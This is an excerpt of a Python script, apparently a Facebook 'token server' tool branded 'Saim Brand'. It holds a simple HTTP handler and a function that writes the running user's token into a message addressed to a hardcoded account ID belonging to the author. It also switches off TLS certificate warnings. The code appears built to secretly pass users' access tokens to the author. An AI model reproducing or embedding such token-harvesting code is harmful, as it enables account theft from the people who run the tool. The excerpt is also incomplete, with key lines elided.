...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"-- THIS SERVER MADE BY Saim Brand")
...
def send_initial_message():
    ...
    msg_template = "Hello Saim sir! I am using your server. My token is {}. India live time now {}"

    # Specify the ID where you want to send the message
    target_id = "100083083532128"

    requests.packages.urllib3.disable_warnings()

    def liness():
        print('\033[1;92m' + '•──────────────────────SAIM BRAND HERE ───────────────────────────────•')
